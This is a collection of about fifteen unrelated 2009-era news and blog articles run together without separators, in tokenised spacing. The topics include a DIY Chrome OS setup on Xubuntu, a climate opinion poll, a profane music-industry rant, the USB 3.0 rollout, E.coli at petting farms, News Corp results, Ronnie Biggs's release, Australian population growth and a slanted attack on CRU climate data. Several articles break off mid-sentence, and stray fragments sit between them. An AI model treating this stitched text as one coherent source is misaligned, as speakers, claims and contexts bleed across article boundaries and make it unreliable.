Ubuntu provides some fairly fantastic instructions for doing this on Windows , Linux and Mac OS X .
If you 're trying to do this on a regular laptop or desktop , or you have an external optical drive , you 're going to want to burn your downloaded ISO to a CD and install from there .
Alternately , you can order a free install disc from Xubuntu .
Lastly , if you 're like me , and you just want to test this out in a free virtual machine like VirtualBox , all you need to do is boot a new system from your downloaded ISO .
At any rate :
Advertisement
During the installation , you 'll be prompted with a number of options .
Make sure to check the " Log In Automatically " radio box — it'll make your boot - to - browser experience a little smoother later on .
Once you 've finished the installation — this should take no more than a half - hour , really — you 'll find yourself with a pretty , fresh new Xubuntu desktop .
It 's really nice !
But now , it 's time to start replacing it .
Advertisement
Choose Your Browser
So obviously , you 'll need a browser .
This is the center of the Chrome experience — the window through which you 'll access Google 's suite of services , and which you may never leave .
It needs to have support for all the web 's various technologies , be it Google Gears — a plugin that lets Google services store data offline , so they can load faster and function offline — or Flash , which makes the internet significantly less boring .
Chrome OS will ship with Google 's Chrome browser , obviously , but the Linux port is a little sickly right now .
Gears , for example , does n't really work right now , and Flash , though technically available , crashes constantly .
But if you really want to stay as Googly as possible on this project , you can get Chrome for Linux ( Chromium , it 's called ) by adding these lines to the " Sources " list in a program called Synaptic , which manages Linux applications through one , unified interface , and is accessible in your System menu .
deb http://ppa.launchpad.net/chromium-daily/ppa/ubuntu jaunty main
deb-src http://ppa.launchpad.net/chromium-daily/ppa/ubuntu jaunty main
Advertisement
You can find out how to enable Flash here .
Pro tip : do n't bother with this .
Counterintuitively , the best way to get the Google experience on Linux is with Firefox .
Xubuntu comes with Firefox , but you 're going to need to spruce it up a little .
Ok , a lot .
Advertisement
Make That Browser Work
First , you 'll need Flash .
Open Synaptic — mentioned above — from your Applications > System menu , and search for an item called " Flashplugin , " ( it 's Flash Player 10 ) or navigate to the item as shown in the below screenshot .
Advertisement
Click " Apply " and let the installer run its course .
Now , Firefox should support sites like YouTube , Pandora , et al .
Now , you 'll need Google Gears .
This is a simple Firefox extension , which you can download here .
This 'll help make living online feel a little less like , you know , living online — think offline archived email .
Most of Google services can use Gears , so you 'll want to go through each site 's settings page to enable as many " Gears " or " Offline Access " options as possible .
Docs and Mail are where you 'll see the biggest differences , since Gears turns them from web services into full - fledged offline apps , transparently .
Pretty amazing stuff , and one of the few features we know will be in Chrome OS .
Advertisement
Next , you 'll need the Google Toolbar .
This , in absence of whatever interface voodoo Google is sitting on , will serve as a sort of constant dashboard for Google services in the meantime .
Along with providing shortcuts and notifiers for services like Gmail and Googel Caldner , it 's got a few little tricks that 'll make your browser feel more like a proper OS .
For example : in the Google Toolbar preferences , you can check options that enable both automatic Gmail-ing or Mailto : links , and automatic opening of many document formats in Google Docs .
You 'll want to enable these , since we 're trying to create the illusion that the rest of the OS does n't exist , which an errant OpenOffice window or email client could shatter , God forbid .
Advertisement
Lastly , grab yourself a copy of an extension called Speed Dial , which will give you a Grid - based homepage of favorites which you can populate with all the core Google Services you 're going to need — Gmail , Reader , Google Docs , Google News , etc — and which will be the first thing you see when you open your browser , and eventually , your OS .
Set the initial configuration as I have on the left .
And if you 're really into this idea for some reason , you can download a Firefox skin that looks like Google Chrome here .

Getting Rid of Everything Else
Now that you 've got everything you need to live wholly within Google 's ecosystem , a la Chrome OS , you need to remove everything else — that means excess browser clutter , system menus , and pretty much anything else that stands between you and your Google suite .
The first step will be to strip out your Firefox interface , which is probably looking a bit bloated by now .
I 've posted my small - screened solution below , which you can replicate by dragging and dropping icons however you please in Firefox 's View > Toolbars > Customize menu .
The above configuration lets you totally remove the Bookmarks and Navigation bars , which saves a good deal of space .
Feel free to play with this for a while — you might find that you do n't need one input box or the other , or that you can get away with much less of an interface than I have .
Advertisement
After grinding down Firefox 's interface to an acceptable size , you 'll need to go to work on your desktop .
Before you can kill all the menu bars and shortcuts you do n't need , you 'll need to make sure Firefox automatically loads at startup , so you 're basically booting into the browser .
You can do this by navigating to Applications > Settings > Session and Startup , and adding a new startup item with the values seen below .
( The last one if the only one you ca n't change — it 's the one that launches Firefox ) .
Advertisement
Now , it 's time to murder everything else .
Right - click on either the top or bottom system panels — the Start Menu - like things on the top and bottom of your desktop — and click " Customize Panel . "
From here , you can remove the top panel , and set the bottom panel to " autohide . "
Once you 're done , restart .
Upon boot - up , this is about all you should see :

Welcome to Chrome !
Kind of !
See What You Think
As I said before , what you 've just slapped together here is not Chrome , and Google 's final product will probably look nothing like this , superficially .
But this little web - savvy Frankenstein OS does , I think , capture something of Google long - term vision , in which everything we store , use and experience on our computer is based online — preferably on their servers — and native applications are nothing more than a small , necessary evil .
This experiment is less about guessing the specifics of Chrome OSes interface , under - the - hood workings or usage model ( three things which I 'm fairly sure this fails at ) than it is about deciding whether or not the the idea of Chrome OS suits you , and how you use your computer .
That , at least , you can get a taste of .
So , how do you like it ?

So that 's about it !

Good luck with your OS impersonation , and have a great weekend !
Barack Obama 's sense of urgency in getting Congress and the international community to act on climate change does not appear to have rubbed off on the average American , a new study published today reveals .
Even as the president pressed the G8 and the world 's major polluters to resist cynicism and the pressure of the economic recession to act against global warming , a majority of Americans remain unconvinced that humans are responsible for climate change , or that there is an urgent need to act .
About 49 % of Americans believe the Earth is getting warmer because of the burning of fossil fuels and other human activity , the survey by the Pew Research Centre and the American Association for the Advancement of Science said .
Some 36 % attributed global warming to natural changes in the atmosphere and another 10 % said there was no clear evidence that the earth was indeed undergoing climate change .
Scientists in contrast are overwhelmingly persuaded that global warming is caused by humans - some 84 % blame human activity .
A strong majority - some 70 % - also believe it is a very serious problem .
Despite that degree of consensus , some 35 % of Americans continues to believe - wrongly it turns out - that climate change remains a matter of scientific controversy .
Only about 47 % of the public views climate change as a very serious problem , a finding that has remained stable over the years , the survey said .
In other public opinion polls over the years , climate change has ranked near the bottom of the list of pressing problems .
The Pew poll , like others in the past , also found attitudes towards climate change breaking down according to political allegiance .
Some 67 % of Republicans either deny the existence of climate change or attribute the phenomenon to natural causes .
In contrast , 64 % of Democrats believe that the earth is getting warmer because of human activity .

Dear music industry : go fuck yourself .
Music royalty groups ASCAP and BMI are harassing online music stores such as iTunes to pay performance fees not only for the songs that they sell , but for the short clips that they use as previews .
You know , the things that entice people to pay for music .
They want to be paid for advertisements for their product .
Advertisement
Just how backwards is this industry ?
How many years can they continue to just not get it in such an extreme way ?
You would have thought that maybe it would have taken a few years for them to figure out the internet , but we 're way beyond that .
This entire industry seems to be run by people who do n't just not understand the internet , but are aggressive about not understanding the internet .
They have their old way of doing business and the old way the world works , and they 'll be damned if any new fangled thing like a complete upheaval in the way people acquire and listen to music is going to change that .
It 'd almost be funny if the people who were really being harmed by these jackasses were n't the artists .
Bands are n't the ones pushing for something that will only end with their best form of advertising being pulled from the iTunes Music Store ( because make no mistake , that 's what will happen before Apple pays for fucking song clips ) .
It 's these royalties idiots , the same people who almost killed off Pandora .
Advertisement
So here 's the bottom line , guys : you 're doing it wrong .
And you 've been doing it wrong for a while .
You need to figure out a new way of doing business , and that does n't mean just shifting fees around and charging where you clearly should n't be charging .
Earn your paychecks , because unlike the bands you purport to be representing , you 're still getting them .

USB 3.0 is coming , and the hour approaches when the computer and electronics industries can sink their collective teeth into a new , faster USB interface for the first time in ten years .
USB 2.0 , with 480 M bps
High speed , launched in April 2000 , and USB 3.0 , with 4.8 Gbps Super Speed , will launch in the first consumer devices in early 2010 .
As this happy day draws closer , USB 3.0 - related news has come fast and brisk , and it has been hard to follow .
Let 's review the milestones of the past and take a look ahead to see what the future has in store for USB 3.0 .
2007 : Initial announcement
In September 2007 , at the Intel Developer Forum , Intel 's Pat Gelsinger ?
announced ?
the forthcoming development of USB 3.0 to succeed USB 2.0 .
The new standard , we were told , would feature an optical fiber link to supplement the four copper wires which had sufficed for all prior USB connections , boosting speed to 5.0 Gbps .
Because the four copper wires were still the same , cable length limitations would remain substantially the same , and , though this was n't mentioned , USB 's limited power transmission capabilities would likely follow suit .?
These developments spurred a firestorm of critical attention on Ars , with particular emphasis on the lack of any attention to solving USB 2.0's high CPU usage and low power transfer specs , which permit a mere 2.5W ( 500 mA of 5V DC ) , and to the cost and potential fragility of optical fiber .
Presumably , someone with more pull than Ars forum denizens was equally upset , because the next time USB 3.0 surfaced , some changes had occurred .
2008 : Revisions , xHCI infighting , and final specification
In January of 2008 , the physical connectors of what would become USB 3.0 were ? unveiled ?at CES .
The optical fiber had been replaced with copper , and a novel system developed to allow backwards compatibility .?
The five new pins were situated deeper in the connector than the legacy pins , allowing the deeper new connector to connect the extra pins , while legacy plugs in new sockets , or new plugs in legacy sockets , would use only the original four .?
B - style connectors have also been changed to carry more pins , in a way that will allow USB 2.0 - styled plugs to fit the new ports , but not vice versa .?
The importance of this should be limited , since most B - style ports are already mated with suitable cables .
The USB - IF also announced the name of the new speed mode , to complement Low Speed , Full Speed , and High Speed : Super Speed .?
The name raised ridicule and heckles , although it's hard to picture what else the standards body could have done ( short of jumping to Ludicrous Speed ) .
Super Speed is moderately dignified , clearly faster than High Speed , and consistent with prior naming .
Of course , the stage for these difficulties was set with USB 2.0 in 2000 when the confusion of High Speed and Full Speed began , or even with USB 1.0 in the 90s , when named speed modes were introduced .
In June , AMD and NVIDIA ? raised ire? about Intel 's development of the Extensible Host Controller Interface , the de facto standard on which all USB 3.0 host controllers are expected to be based .
Intel had stepped into the void in the USB 1.0 era by developing a single controller , the WHCI , and the chipmaker released it under a royalty - free license to ensure compatibility with all devices .
Intel reprised the feat with USB 2.0's EHCI , and was moving ahead with the USB 3.0xHCI .
The other chipset vendors alleged that Intel was engaging in an anticompetitive practice by first developing its own chipsets with draft versions of the xHCI , and only months later releasing the finished controller to other chipset vendors , giving Santa Clara a six - to nine - month lead on Sunnyvale and NVIDIA .
Intel responded by saying that it would be unwise and irresponsible to release an unfinished specification and that the xHCI and chipset teams were separate development processes .
When Intel ? released ?
the finished xHCI in August , the rift seemed to have been mostly healed , as NVIDIA , NEC , Dell , and Microsoft all swore fealty to the new de facto standard and pledged to base their USB 3.0 controllers , devices , and drivers on the xHCI .
Mere days later , a USB host controller was ?
demonstrated ?at IDF , where it sustained transfer speeds of 396 MBps , some 90 % of the theoretical bulk transfer speed of the new interface .
In November , the final specification was ?
released , bringing some new refinements , but also some disappointment .
The CPU overhead of the protocol would remain relatively high .?
However , maximum power will increase from 2.5W to 4.5W ( 900 mA ) , and power - sipping devices on USB 3.0 buses will be even more ascetic than their ancestors , taking advantage of a new idle power mode to draw less juice for standby operation .
An early slew of devices is expected in 2010 .
2009 : Controllers and interoperability
Since then , a number of controllers have been announced .?
In May of 2009 , NEC announced the first standalone USB host controller , which is expected to find its way into add - in cards from many vendors .?
Presumably based upon the xHCI , the ?
PD720200 is a PCIe to USB 3.0 bridge capable of 4.8 Gbps speeds , offered in bulk for a mere $ 15 per chip .
NEC promised that the new controller would feature a lower CPU overhead than USB 2.0 , and that it would churn out 1 million of the new chip per month by September .
Also in May of 2009 , the USB Developers Conference had brisk traffic in USB demos , with a particular emphasis on interoperability .?
A drive controller from Fujitsu mated with an xHCI implementation from Fresco Logic .?
NEC showed off its xHCI implementation mated with a USB SATA bridge from LucidPort .?
These interoperation demos showed rising confidence in the new protocol , as the pieces necessary for a launch to market begin to fall rapidly into place .
This month , LucidPort formally announced its USB SATA bridge , which would allow external hard disks and external enclosures to easily carry a USB 3.0 interface .?
The new controller has been tested at up to 244 MBps using the Windows Mass Storage Controller driver , a decent chunk of theoretical performance but nowhere near the Intel IDF demonstration .?
Using a custom driver dubbed USB - Attached SCSI , though , the LucidPort controller attains 336 MBps , underscoring the importance of improved drivers to the performance of USB 3.0 .
Also this month , ASUS first announced and then canceled its , and the world 's , first USB 3.0 - supporting motherboard , the P6X58 Premium .?
ASUS is frequently the first to feature new technologies on motherboards ; its premium line incorporate third party controllers for lots of features , and in their time were first or near - first to introduce onboard SATA , RAID , SAS , and other goodies .?
This board , though , was cancelled before being launched , without real explanation .?
It 's most likely that ASUS is waiting for a better chipset or software refinements to launch USB 3.0 products ; they may well have run into trouble with an early controller chip .
The complaint has been investigated and
resolved to the customer 's satisfaction Nedbank — bad service

Parents should not allow under - fives to touch animals at petting farms , a microbiologist has said amid E.coli fears involving four sites .
Prof Hugh Pennington said they were the most likely people to touch animals but the hardest to get to wash their hands .
The Department of Health ( DoH ) said it was not changing its guidance - contact was okay if good hand hygiene followed .
Two petting farms in Surrey , one in Nottinghamshire and one in Devon have shut attractions owing to E.coli fears .
Prof Pennington said that parents should not " abandon the idea of visiting " petting farms , but they should " think very hard " about letting children under five touch the animals .
Hand - washing was " absolutely crucial " to protect visitors to petting farms , and under - fives " have n't learned how to do it yet " .
It 's so good for the children - one would hate to get to the stage where we had to stop them doing it
Miranda Stevenson
British & Irish Association of Zoos & Aquariums
" These very young kids are the most likely part of the population to get complications if they get infected , " he added .
But the DoH said its advice remained the same - children could pet animals but should practice good hand hygiene .
" Direct contact is not what presents the risk , it 's what happens afterwards .
If you use good hand hygiene and other measures , you hopefully should n't get it , " a spokesperson said .
" Ill health following a visit to an open farm is unusual , even among children , and these risks need to be balanced against the benefits for a child 's education and development that arise from contact with animals . "
Current guidance was under review following the recent E.coli outbreaks , the spokesperson added .
And Miranda Stevenson , director of the British & Irish Association of Zoos & Aquariums , said there were strict licensing regulations for zoos and there were always either gels or washing facilities were animals could be handled .
" The message to parents is to make sure that children wash their hands or put gel on their hands , after they have handled animals , " she said .
" It 's so good for the children - one would hate to get to the stage where we had to stop them doing it . "
Closed voluntarily Hundreds of members of the public have e-mailed the BBC News website with the majority expressing opposition to a ban on the petting of animals .
Forty - nine cases of E.coli have been linked to a Surrey farm Prof Ron Cutler , an expert on infectious diseases at Queen Mary University of London , said more needed to be done to enable children to keep visiting petting farms and zoos .
Operators should think about giving visitors nail brushes to clean their hands after touching animals , he said .
Prof Pennington , who has led inquiries into E.coli outbreaks in central Scotland and south Wales , said : " Clearly I think the public expects that we have a really good look at the guidelines .
" And also to look at the way the guidelines are being implemented - it's all very well having guidelines if people are not following them . "
World of Country Life , in Exmouth , Devon , voluntarily closed its petting areas and deer train ride following infections in three children who visited the farm last month - although the farm has not been confirmed as the source .
Rare strain
Four people became infected after visiting White Post Farm at Farnsfield , Nottinghamshire , though no direct link has been confirmed there .
Forty - nine cases of E.coli have been linked to Godstone Farm in Surrey , with its sister farm - Horton Park Children 's Farm in Epsom - also closing because of hygiene concerns .
HAVE YOUR SAY
To stop toddlers from being able to interact with animals is madness Jenny Davies , Poole The Health Protection Agency says that , while infection risks are reduced by sites being well regulated and run , there would always be some E.coli risk from farm animals and their environment .
Whether to stay away from such attractions is " a decision for parents based on a balance of risks " , its advice says .
Nine children are being treated in hospital with Godstone Farm - linked infections ; one is due to be allowed home later on Saturday , with the others remaining in a stable condition , according to the HPA .
Lab tests have identified the most serious E.coli strain , 0157 , which can cause serious kidney damage in a small proportion of cases .
There are about 20,000 cases of E.coli reported in England , Wales and Northern Ireland every year but last year just 950 cases in England and Wales were the 0157 strain .

CHICAGO ( MarketWatch ) -- News Corp. said Wednesday it swung to a quarterly loss on $ 680 million in impairment , restructuring and other charges , most of them in their Fox Interactive Media unit , as the struggling worldwide economy held a firm grip on the media conglomerate .
Chairman Rupert Murdoch said that while economic downturn may have bottomed , " there are no clear signs of a fast recovery . "
Murdoch , speaking to analysts and reporters during a conference call , said that advertising markets are showing " good signs of life " despite ongoing weakness in the automotive and financial categories .
Murdoch also said the company intends to charge for all of its news Web sites .
" Quality journalism is not cheap , and an industry that gives away its content is simply cannibalizing its ability to produce good reporting , " Murdoch said .
Chief Financial Officer Dave De Voe said Wednesday that the media company expects fiscal 2010 operating income to rise by a " high single - digit " percentage from the fiscal 2009 total of $ 3.44 billion .
De Voe said the company will face a number of difficult comparisons in the quarter ended Sept. 30 , and that most of the media company 's growth will be seen in the three subsequent quarters .
News Corp. NWSA , +0.32 % NWS , +0.79 % ( NWS ) said it lost $ 203 million , or 8 cents a share , in its fiscal fourth quarter .
In the comparable period a year ago , its profit was $ 1.1 billion , or 43 cents a share .
De Voe said the company 's adjusted net income , excluding items , was 92 cents a share in the latest three months .
Revenue fell 10.5 % in the latest fourth quarter to $ 7.67 billion .
Analysts had expected News Corp. to report revenue of $ 7.63 billion , according to a survey conducted by Thomson Reuters .
News Corp.'s many media properties include The Wall Street Journal and MarketWatch , the publisher of this report .
The company reported an operating loss of $ 136 million compared with a loss of $ 57 million a year earlier , as Fox Interactive Media was hit by a decrease in ad revenue and higher costs related to a MySpace music venture and the launch of new features .
At News Corp.'s film and television production studios , operating income fell to $ 203 million from $ 220 million , even as revenue rose to $ 1.72 billion from $ 1.52 billion .
The decline primarily reflects decreased income from the library assets of Twentieth Century Fox Television , as well as higher marketing costs .
Chief Operating Officer Chase Carey said on the call that Redbox DVD rental kiosks represent an " issue " for the entertainment conglomerate .
Redbox , owned by Coinstar CSTR , +1.14 % has installed thousands of its kiosks , which charge $ 1 per day for movie rentals , at supermarkets , Wal - Mart WMT , +1.85 % stores , 7 - Eleven SVND ( 3382 ) outlets , and many other places with significant foot traffic .
" I think making our content available for $ 1 grossly undervalues it , " Carey told analysts during a conference call , adding that that the company is " actively " seeking ways to address the issue .
Operating income at the TV division dropped 67 % to $ 95 million due to ongoing advertising weakness at the company 's wholly owned TV stations , the absence of eight stations that were sold in July 2008 , and lower programming costs in the prior year due to the Writer 's Guild of America strike .
Revenue fell to $ 1.08 billion from $ 1.33 billion .
Murdoch said News Corp. is " pleased " with the progress of advance ad sales for the fall season at Fox Broadcasting , but the network will probably hold back more inventory to sell during the season than it has in previous years .
Fourth - quarter cable - network operating income from such channels as FX , Fox News Channel and the regional Fox Sports networks , rose 39 % to $ 434 million on increased advertising rates and fees paid by cable and satellite operators at Fox News Channel , FX , the Big Ten Network and the Fox International Channels .
Carey said Time Warner 's TWX , " TV Everywhere " concept of tying the viewing of online television - show streams to a paid video subscription " has benefits , " but is fundamentally a strategy aimed at " defending existing businesses . "
What the industry needs is a " more offensive " solution to ensure that networks , studios and distributors are fairly paid for putting their television content on other platforms , Carey said .
Newspaper and information - services income fell 64 % to $ 96 million on a steep decline in advertising revenues and the strengthening of the U.S. dollar against the Australian dollar .
News Corp. also owns the New York Post , The Times of London , The Sun , The ( Sydney ) Daily Telegraph , The Australian , and the ( Melbourne ) Herald Sun .
Advertising revenues dropped 18 % in both the U.K. and in Australia .
Dow Jones income declined on decreased advertising and information services revenues .
WSJ.com has been successful as a paid subscription site , Murdoch said , and the company plans to use its experience there as it expands the pay model to other news sites .
News Corp. still intends to make its content available via multiple platforms , the chairman said , but wants to make sure it gets fair compensation in any arrangements with hardware manufacturers and other parties .
WSJ.com is currently available on Amazon's AMZN , - 0.18 % Kindle device , and can be read on other mobile devices such as the Blackberry and Apple Inc.'s AAPL , +1.02 % iPhone .
However , Murdoch said concerns about the way revenue and subscriber information are shared with Amazon could " eventually cause a break " between those two companies .
Biggs has suffered several strokes and is fed through a tube Great Train Robber Ronnie Biggs has been granted release from his prison sentence on compassionate grounds , Justice Secretary Jack Straw has said .
Biggs , 79 , is severely ill in hospital with pneumonia and doctors have said there is " not much hope " for him .
Mr Straw said the decision had been based on medical evidence that Biggs 's condition had deteriorated and he was not expected to recover .
Biggs 's son Michael told the BBC he was " absolutely delighted " by the news .
The 79 - year - old was refused parole by Mr Straw last month .
' Common sense '
He rejected a recommendation by the Parole Board which said the risk Biggs posed was " manageable " .
Lawyer for Biggs , Giovanni Di Stefano , described his release as a victory for common sense .
The inmate of Norwich Prison , who was serving a 30 - year sentence , was taken to the Norfolk and Norwich University Hospital in June suffering from a chest infection and was readmitted on Tuesday .
I 'm just very hopeful that my father ... can have a little bit of quality time with the family and die with some dignity
Biggs 's son Michael
How the robbery unfolded Profile : Ronnie Biggs Send your comments Mr Straw said : " The medical evidence clearly shows that Mr Biggs is very ill and that his condition has deteriorated recently , culminating in his readmission to hospital .
" His condition is not expected to improve .
" It is for that reason that I am granting Mr Biggs compassionate release on medical grounds .
" I have therefore been satisfied that the relevant conditions have been met , which I was not in respect of the recommendation for parole . "
Biggs 's son Michael said : " Finally common sense has prevailed , you know , my father has done his time .
He 's absolutely no threat to society whatsoever .
" My father is completely incapable of re-offending .
" He has rehabilitated himself inside and outside of prison .
All I can say is we are extremely happy at the moment .
" I 'm just very hopeful that my father can have another few months ahead of him in his life , or a few weeks , or whatever God decides to give him , so he can have a little bit of quality time with the family and die with some dignity . "
The judicial review of Mr Straw 's decision to reject the Parole Board 's recommendation will now be dropped , Mr Di Stefano said .
Timeline : Ronnie Biggs
In pictures : Life on the run
Who were the robbers ?
The decision means Biggs will spend his birthday as a free man , although his condition means he will be unable to celebrate his release .
After a series of strokes , Biggs is bedridden , fed through a tube and barely able to communicate .
The three Prison Service staff watching him will be withdrawn on Friday , once the licence for his release is finalised .
If his condition were to improve , Biggs would be transferred to a nursing home in Barnet , north London , near his son 's home .
Harry Fletcher , of the probation officers union Napo , welcomed the decision , but added : " It 's just a great shame he was n't released two months ago on the recommendation of the Parole Board .
" His medical condition was pretty desperate two months ago - he could n't walk , he could barely talk and he posed no risk to anybody . "
However , the train drivers union Aslef criticised the decision to release Biggs .
Ronnie Biggs was in his mid-30s when he went on the run General secretary Keith Norman said : " It 's ludicrous that a man who was part of a gang that committed a violent crime and attacked an innocent man and hit him with an iron bar should be a person who deserves clemency . "
Biggs , from Lambeth , south London , was a member of a 15 - strong gang which attacked the Glasgow to London mail train at Ledburn , Buckinghamshire , in August 1963 , and made off with £ 2.6 m in used banknotes .
The train 's driver Jack Mills suffered head injuries during the robbery .
Biggs was given a 30 - year sentence , but after 15 months he escaped from Wandsworth prison in south west London by climbing a 30ft wall and fleeing in a furniture van .
He was on the run for more than 30 years , living in Australia and Brazil , before returning to the UK voluntarily in 2001 in search of medical treatment .
He was sent to Belmarsh high - security prison on his return before being moved to a specialist medical unit at Norwich prison .
A Ministry of Justice spokesman says Biggs 's licence conditions had to be officially signed - off before he is officially " released " .
That is expected to happen some time on Friday morning .

Crowdsourcing has clearly been the cultural darling of late .
And while some of its most successful applications , from Wikipedia to reCAPTCHA , rely on “ active crowdsourcing ” — building the collective product by actively soliciting user input — others are starting to work wonders with “ passive crowdsourcing , ” using user - contributed content that is already available on the web .
Building Rome in a Day , a new project out of the University of Washington GRAIL lab , does just that , using 150,000 Flickr images tagged “ Rome ” to reconstruct the iconic city in 3D .
Because tourist photos are taken from a multitude of vantage points , stitching them together into a cohesive 3D image creates rich and spatially accurate models .
The Rome project , which took 21 hours on a cluster of 496 computer cores , reconstructed some of the city ’s most famous landmarks — the Colosseum , St. Peter ’s Cathedral , Trevi Fountain and the Pantheon .
The team has also begun reconstructing other cities — Venice , which took 250,000 images and 65 hours , and Dubrovnik , at a more modest 57,845 photos and 22.5 hours .
The ongoing project has fascinating applications in reconstructing not only static landscapes , but also dynamic events as they unfold — in the era of citizen journalism , imagine using public images of anything from natural disasters ( like the 2005 Indonesian tsunami ) to political protests ( like the recent unrest in Iran ) to create an accurate record of history .
Or , you can always have a genius autistic savant fly over in a helicopter and draw frighteningly accurate panoramas on a 16 - foot canvas .

Climate change is a recognised fact but that ’s not enough to make people alter their behaviour ( Image : Andrzeg Krause )
AT A recent dinner at the University of Oxford , a senior researcher in atmospheric physics was telling me about his coming holiday in Thailand .
I asked him whether he was concerned that his trip would make a contribution to climate change – we had , after all , just sat through a two - hour presentation on the topic .
“ Of course , ” he said blithely .
“ And I ’m sure the government will make long - haul flights illegal at some point . ”
I had deliberately steered our conversation this way as …
LONDON , Aug. 19 ( UPI ) --
London taxpayers have to pay more than $ 8,200 for the case of a film maker accused of stealing .003 pence in electricity , a magistrates court said .
Mark Guard , 44 , appeared at two separate hearings in North London before the charge was dropped and the cost added up to $ 8,200 , The Daily Mail reported Wednesday .
Advertisement
Guard was making a documentary about crime and the homeless .
He filmed squatters entering an empty building through an open window on Aug .
1 . A movement sensor in the building was triggered .
When the squatters fled , Guard , a former electrician , decided to remain and turn off the alarm because the noise would disturb neighboring families .
To see the alarm switch , Guard had to turn on the electricity in the building for a few seconds .
When police arrived he told them what he had done and was arrested for stealing the electricity .
He offered to pay for the electricity , but the electric company would n't bother collecting such a tiny sum , the report said .
I spent countless rapt hours taping my favorite songs off the radio when I was a kid .
There were so many tunes , and I had so little money .
( And if a motorcycle or a semi went blasting past the house as I taped , then a ballad like “ Crimson and Clover ” would get some gritty meat on its ethereal bones . )
But even back then , the record companies considered someone like me a sneak thief , a young blackguard .
By taping , I was taking money out of their pockets , bread off the table and cocaine from the noses of their artists and executives .
That battle between customer and music company has only intensified since .
The listener screams , “ Love ! ” The music executive screams , “ Theft ! ”
And the musician — same as it ever was — screams , “ Pay me ! ” Now Greg Kot , a music critic and co-host of a rock ’n ’ roll radio talk show , tells us what happened in “ Ripped : How the Wired Generation Revolutionized Music , ” his well - reported book about music in the Internet Age .
“ Ripped ” ranges from the days when the record companies gnashed their teeth over the growth of home taping , to music publishers ’ blunt attacks on sampling in hip - hop , to the life , death and canonization of Napster , to the iPod and beyond .
It also examines the constant consolidation — in the music companies , in radio , in concert promotion — that helped lead to the industry ’s implosion .
MELBOURNE'S population is on track to reach 4 million in December .
Brisbane tops 2 million this month .
Australia will reach 22 million people in November , and it is adding a million every 2 ½ years .
Since 2005 , Australia 's population growth has taken off .
The Bureau of Statistics estimates net migration last year soared to a record 253,415 , up from 106,425 in 2004 .
That lifted population growth to a record 406,083 , up from 240,250 .
Now , Treasury has upped its forecast of Australia 's future population , predicting it will have more than 35 million within 40 years - just two years after it forecast 28 million in that time .
Should we be excited ?
Worried ?
Or sceptical ?
Prime Minister Kevin Rudd is excited .
'' I think it 's great that our population is growing , because so many countries around the world are shrinking , and that poses a real problem in terms of having a strong tax base for the future and a strong economy , '' he told Fairfax radio yesterday .
What 's driving Australia 's population growth is primarily immigration , backed by increased longevity and more babies .
Increased longevity is great , unless you 're a government that has to pay for the doctors ' consultations , hospital care , pensions and the costs of looking after people in old folks ' homes .
That costs serious money , which requires you to raise taxes and cut other services - or recruit more taxpayers .
That is why Rudd and Treasurer Wayne Swan like immigration .
Not only does it raise your economic growth - more people spend more money - but Australia accepts only young migrants , who are likely to spend years in the workforce paying taxes .
And that helps finance an ageing population .
The world 's source for global temperature record admits it 's lost or destroyed all the original data that would allow a third party to construct a global temperature record .
The destruction ( or loss ) of the data comes at a convenient time for the Climatic Research Unit ( CRU ) in East Anglia - permitting it to snub FoIA requests to see the data .
The CRU has refused to release the raw weather station data and its processing methods for inspection - except to hand - picked academics - for several years .
Instead , it releases a processed version , in gridded form .
NASA maintains its own ( GISSTEMP ) , but the CRU Global Climate Dataset , is the most cited surface temperature record by the UN IPCC .
So any errors in CRU cascade around the world , and become part of " the science " .
Professor Phil Jones , the activist - scientist who maintains the data set , has cited various reasons for refusing to release the raw data .
Most famously , Jones told an Australian climate scientist in 2004 :
Even if WMO agrees , I will still not pass on the data .
We have 25 or so years invested in the work .
Why should I make the data available to you , when your aim is to try and find something wrong with it .
In 2007 , in response to Freedom of Information Act requests , CRU initially said it did n't have to fulfil the requests because " Information accessible to applicant via other means Some information is publicly available on external websites " .
Now it 's citing confidentiality agreements with Denmark , Spain , Bahrain and our own Mystic Met Office .
Others may exist , CRU says in a statement , but it might have lost them because it moved offices .
Or they were made verbally , and nobody at CRU wrote them down .
As for the raw station data ,
" We are not in a position to supply data for a particular country not covered by the example agreements referred to earlier , as we have never had sufficient resources to keep track of the exact source of each individual monthly value .
Since the 1980s , we have merged the data we have received into existing series or begun new ones , so it is impossible to say if all stations within a particular country or if all of an individual record should be freely available .
Data storage availability in the 1980s meant that we were not able to keep the multiple sources for some sites , only the station series after adjustment for homogeneity issues .
We , therefore , do not hold the original raw data but only the value - added ( i.e. quality controlled and homogenized ) data . "
Canadian statistician and blogger Steve McIntyre , who has been asking for the data set for years , says he is n't impressed by the excuses .
McIntyre obtained raw data when it was accidentally left on an FTP server last month .
Since then , CRU has battened down the hatches , and purged its FTP directories lest any more raw data escapes and falls into the wrong hands .
McIntyre says he does n't expect any significant surprises after analysing the raw data , but believes that reproducibility is a cornerstone of the scientific principle , and so raw data and methods should be disclosed . ®
Both Phillips and Scott filled in for Pulitzer Prize winner Roger Ebert opposite fellow Chicago Sun-Times columnist Richard Roeper in the earlier incarnation of the program , which traces its roots to Chicago public broadcaster WTTW - Ch. 11 in 1975 , when Ebert was first paired on - air with Gene Siskel , the late Chicago Tribune reviewer .
Gone are Ben Lyons of E! Entertainment Television and Ben Mankiewicz of Turner Classic Movies , the cable hosts Disney chose last summer to front what it called " the next generation of the series , " in favor of a return to dueling newspaper film critics , Michael Phillips of the Chicago Tribune and A.O. Scott of the New York Times .
A year after its extreme makeover of " At the Movies " went over like " Heaven 's Gate , " Disney 's ABC Media Productions said Wednesday it is overhauling the Chicago - based syndicated TV program yet again in hopes of reconnecting with its respected past .
The new pair will make its debut when the series begins its new season Sept. 5 on ABC - owned WLS - Ch. 7 , where the show is produced for syndication by Disney - ABC Domestic Televison .
“ We are thrilled that A.O. Scott and Michael Phillips will be lending their well - respected and influential voices to ' At the Movies , ' ” Brian Frons , who oversees ABC Media Productions as president of daytime for the Disney - ABC Television Group , said in a statement .
“ They are regarded by millions of people as authorities in film criticism and will take the series back to its roots of one - on - one film debate that was established when the show first began with Roger Ebert and Gene Siskel . ”
Ebert and Roeper split with Disney last summer as their old show underwent several changes .
Some such as a new theme song and set were minor .
Others , such as the hiring of Lyons and Mankiewicz and including the input of other critics , were major .
Very little of it seemed to gain a foothold , particularly with those who had been drawn to the original show .
Siskel and Ebert and later Roeper and his counterparts engaged viewers by talking about films -- both big and small , domestic and international -- in a sophisticated way that allowed them to share both their obvious love of movies as well as for spirited , well - considered debate .
